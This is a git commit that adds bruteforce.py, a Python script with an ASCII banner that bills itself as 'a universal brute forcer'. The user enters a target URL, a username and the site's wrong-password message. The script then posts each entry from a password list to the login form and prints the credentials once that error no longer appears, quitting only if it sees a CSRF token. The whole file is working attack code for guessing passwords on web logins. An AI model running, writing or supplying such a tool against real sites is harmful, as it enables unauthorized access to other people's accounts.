1be6fb09e86ace58299d413edb747665692bee17
ctoANG <67552526+ctoANG@users.noreply.github.com>
2020-10-30 17:51:32 +0100

    Add files via upload

---
+++ bruteforce.py
@@ -0,0 +1,49 @@
+import requests
+from termcolor import colored
+from colorama import Fore, init
+
+
+print(Fore.LIGHTCYAN_EX + """\
+██████╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗███████╗
+██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██║   ██║██╔════╝
+██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║███████╗
+██╔══██╗██╔══██╗██║   ██║   ██║   ██║   ██║╚════██║
+██████╔╝██║  ██║╚██████╔╝   ██║   ╚██████╔╝███████║
+╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝
+
+A universal brute forcer!
+
+ """ + Fore.RESET)
+
+                                                   
+
+url = input("Enter Target Url: ")
+username = input("Enter Target Username: ")
+error = input("Enter Wrong Password Error Message: ")
+
+try: 
+    def bruteCracking(username,url,error):
+        for password in passwords:
+            try:
+                password = password.strip()
+                print("Trying:" + password)
+                data_dict = {"username": username,"password":password, "login":"submit"}
+                response = requests.post(url, data=data_dict)
+                if error in str(response.content):
+                    pass
+                elif "csrf" in str(response.content):
+                    print("CSRF Token Detected!! BruteF0rce Not Working This Website sorry honey.")
+                    exit()
+                else:
+                    print("Username: ---> " + username)
+                    print("Password: ---> " + password)
+                    exit()
+            except:
+                pass
+except:
+    print("Some Error Occurred Please Check Your Internet Connection !!")
+
+with open("passwords.txt", "r") as passwords:
+    bruteCracking(username,url,error)
+
+print("[!!] password not in list try a new pass list")
